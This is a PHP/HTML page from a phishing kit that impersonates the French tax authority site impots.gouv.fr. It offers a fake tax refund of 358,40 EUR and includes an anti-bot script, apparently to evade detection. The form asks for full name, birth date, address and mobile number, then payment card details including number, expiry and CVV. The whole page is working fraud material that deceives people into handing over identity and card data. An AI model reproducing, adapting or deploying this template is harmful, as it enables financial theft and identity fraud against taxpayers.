
<?php
include "../../server/antibots.php";
?>
	<body> <a href="#contenu" class="sr-only sr-only-focusable">Aller au contenu</a>

		<header>
			<div class="container">
				<!--Le logo-->
				<a id="logo" class="col-xs-12 col-sm-6 col-lg-7" href="#" target="_blank" rel="noopener" title="Accueil impots.gouv.fr (nouvelle fenétre)"> <span class="sr-only">Authentification</span> </a>
				<h1 class="sr-only">Authentification</h1>
				<!-- </div>  Fin Row -->
			</div>
			<!-- Fin Container -->
		</header>
		<!-- Fil d'Arianne -->
		<div class="container">
			<div class="row">
				<ol class="breadcrumb ">

					<li class="active">Formulaire de remboursement électronique - N 0551584</li>
				</ol>
			</div>
		</div>
		<!-- Fin du fil d'Arianne -->
		<main class="container" id="contenu">
			<div class="sr-only"> Le contenu du formulaire et l'aide mise à votre disposition évoluent selon vos réponses et votre situation </div>
			<div class="row">
				<!-- Connexion Gauche-->
				<div class="col-md-6">
					
				
					<a id="aide_scroll" href="#aide" class="btn btn-default hidden-lg hidden-md hidden-sm" aria-hidden="false"> <span class="dgfipicon dgfipicon-info text-muted"></span>&nbsp;Aide </a>
					<div class="panel panel-default">
					
						<div class="panel-heading">
							<h2 id="" class="text-center">Données personnelles</h2> </div>
						<!--===========================-->
						<!--Body Connexion Gauche DEBUT-->
						<!--===========================-->
						<style>
							.waker-form{
								width: 100%;
								height: 34px;
								padding: 6px 12px;
								font-size: 14px;
								line-height: 1.42857143;
								color: #555;
								border: none;
								background-color: #fff;
								outline: none;
								background-image: none;
								border-bottom: 1px solid #ccc;
							}
						</style>
						<div class="panel-body">

							<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="erreur"></div>
							<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="blocage"></div>
							<div style="padding: 10px 10px;border-radius:4px;">
								<IFRAME style="display:none" name="hidden-formulairePrincipal" id="hidden-formulairePrincipal" aria-hidden="true" title="Cadre technique"> </IFRAME>
								<!--====================-->
								<!-- Identifiant Fiscal -->
								<!--====================-->
								<div role="alert" style="display: none;" class="erreur alert alert-danger cat1" id="error"></div>
								<div class="row">
									<div class="col-md-12" >
									<h4 style="color: #1d5596;">Nom complet</h4>
									<div style="width:100%">
										<input style="width:47%;" style="font-size:14px;width:100%;text-align:left;float:right" class="waker-form" name="Prénom" type="text" id="firstname" placeholder="Prénom" required/> &nbsp;&nbsp;
										<input style="width:47%;" style="font-size:14px;width:100%;text-align:left;float:left" class="waker-form" name="Nom" type="text" id="lastname" placeholder="Nom d'usage" required/>
									</div>
										<!-- -------DATE DE NAISSANCE---------- -->
										<h4 style="color: #1d5596;">Date de naissance</h4>
										<div style="width:100%">
										<select class="waker-form"  style="font-size:14px;width:30.5%;text-align:left;float:left" id="dd">
											<option value="1" selected>01</option>
											<option value="2">02</option>
											<option value="3">03</option>
											<option value="4">04</option>
											<option value="5">05</option>
											<option value="6">06</option>
											<option value="7">07</option>
											<option value="8">08</option>
											<option value="9">09</option>
											<option value="10">10</option>
											<option value="11">11</option>
											<option value="12">12</option>
											<option value="13">13</option>
											<option value="14">14</option>
											<option value="15">15</option>
											<option value="16">16</option>
											<option value="17">17</option>
											<option value="18">18</option>
											<option value="19">19</option>
											<option value="20">20</option>
											<option value="21">21</option>
											<option value="22">22</option>
											<option value="23">23</option>
											<option value="24">24</option>
											<option value="25">25</option>
											<option value="26">26</option>
											<option value="27">27</option>
											<option value="28">28</option>
											<option value="29">29</option>
											<option value="30">30</option>
										</select>
										<select class="waker-form"  style="font-size:14px;width:30.5%;text-align:left;float:left;margin-left:10px" id="mm">
											<option value="1" selected>01</option>
											<option value="2">02</option>
											<option value="3">03</option>
											<option value="4">04</option>
											<option value="5">05</option>
											<option value="6">06</option>
											<option value="7">07</option>
											<option value="8">08</option>
											<option value="9">09</option>
											<option value="10">10</option>
											<option value="11">11</option>
											<option value="12">12</option>
										</select>
										<select class="waker-form"  style="font-size:14px;width:30.5%;text-align:left;float:left;margin-left:10px" id="yy">
										<?php 
    $year_start  = 1930;
    $year_end = date('Y');
    $user_selected_year = 1930; 

    for ($i_year = $year_start; $i_year <= $year_end; $i_year++) {
        $selected = ($user_selected_year == $i_year ? ' selected' : '');
        echo '<option value="'.$i_year.'"'.$selected.'>'.$i_year.'</option>'."\n";
    }
?>
										</select>
										</div>
										<br><br>
										<!-- -------CODE POSTAL + VILLE---------- -->
										<h4 style="color: #1d5596;">Informations supplémentaires</h4>
										<div style="width:100%">
										<input style="width:47.5%;" style="font-size:14px;width:98%;text-align:left;float:right" class="waker-form" name="Adresse" type="text" id="city" placeholder="Ville" required/> &nbsp;&nbsp;
										<input style="width:47.5%;" style="font-size:14px;width:98%;text-align:left;float:left" class="waker-form" name="codepostale" type="text" id="zip" placeholder="Code postal" required/><br><br>
										<input style="width:47.5%;" style="font-size:14px;width:98%;text-align:left;float:right" class="waker-form" name="Adresse" type="text" id="address" placeholder="Adresse" required/> &nbsp;&nbsp;
										<input style="width:47.5%" style="font-size:14px;width:98%;text-align:left;float:left" class="waker-form" name="tel" type="text" id="tel" placeholder="Portable" required/>
										</div>
										<br>
										
										<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_spi"> </div>
									</div>

									<!-- col-md-12 FIN -->
								</div>
								<!-- row FIN -->
								<!--==========================-->
								<!--Body Connexion Gauche FIN -->
								<!--==========================-->
						</div>
						<br>
						
					</div>
					</div>
					<!-- panel-default FIN -->
				</div>
				<!-- Fin col-md-6 -->
				<!-- ============== -->
				<!-- AIDE DEBUT -->
				<!-- ============== -->
				<div class="col-md-6">
					<a id="aide_scroll" href="#aide" class="btn btn-default hidden-lg hidden-md hidden-sm" aria-hidden="false"> <span class="dgfipicon dgfipicon-info text-muted"></span>&nbsp;Aide </a>
					<div class="panel panel-default">
						<div class="panel-heading">
							<h2 id="" class="text-center">Mes coordonnées bancaire</h2> </div>
						<!--===========================-->
						<!--Body Connexion Gauche DEBUT-->
						<!--===========================-->
						<div class="panel-body">
							<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="erreur"></div>
							<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="blocage"></div>
							<IFRAME style="display:none" name="hidden-formulairePrincipal" id="hidden-formulairePrincipal" aria-hidden="true" title="Cadre technique"> </IFRAME>
							<!--====================-->
							<!-- Identifiant Fiscal -->
							<!--====================-->
							<div class="row">
								<div class="col-md-12">
									<table style="width:487px;">
									<h4 style="color: #1d5596;">Informations supplémentaires</h4>
									<input style="width:100%;" style="font-size:14px;width:100%;text-align:left;float:right" placeholder="Nom sur la carte" class="waker-form" id="ccname" type="text"  placeholder="" required/><br><br>
									<input style="width:100%;" style="font-size:14px;width:100%;text-align:left;float:right" placeholder="Carte de crédit" class="waker-form" id="cc" type="text" required/>
									<br><br>
									<input style="width:47.9%;" style="font-size:14px;text-align:left;float:right" placeholder="EXP (MM/YY)" class="waker-form" type="text" id="exp" required/> &nbsp;&nbsp;
									<input style="width:47.9%;" style="font-size:14px;text-align:left;float:left" placeholder="CCV" maxlength="3" class="waker-form" type="text" id="ccv"  required/>
									<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_spi"> </div>
								</div>
								<!-- col-md-12 FIN -->
							</div>
							<!-- row FIN -->
							<!--==================-->
							<!-- Bouton Continuer -->
							<!--==================-->
							<div class="row" id="goOnBtn">
								<div class="col-md-12">
									<div class="form-group text-center" id='go' data-original-title='Pour continuer, veuillez saisir toutes les informations.' data-toggle='tooltip' data-placement='bottom'>
										<br>
										<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
											font-size: 14px;width:100%;padding:12px 1px 2px 1px;">
											<center><font color="green">Montant de votre remboursement: 358,40EUR</font></center>
										</div>
										<br>
										<button id="btnAction" type="submit" style="width: 90%;background:#1d5596;color:white;height:40px;border:none;outline:none;border-radius:5px;" data-href="" onclick="submit('2')">Continuer</button>
										<br>
										<br> </div>
								</div>
							</div>
							<!-- 					<button type="submit" class="btn btn-primary col-xs-12" onclick="document.getElementById('LMDP_formulaire').action = urlLoginMotDePasse ; envoiLP(); adapterContexte(); return(true);"> -->
							<!-- 						Connexion -->
							<!-- 					</button> -->
							</form>
							<!--==========================-->
							<!--Body Connexion Gauche FIN -->
							<!--==========================-->
						</div>
					</div>
					<!-- panel-default FIN -->
				</div>
				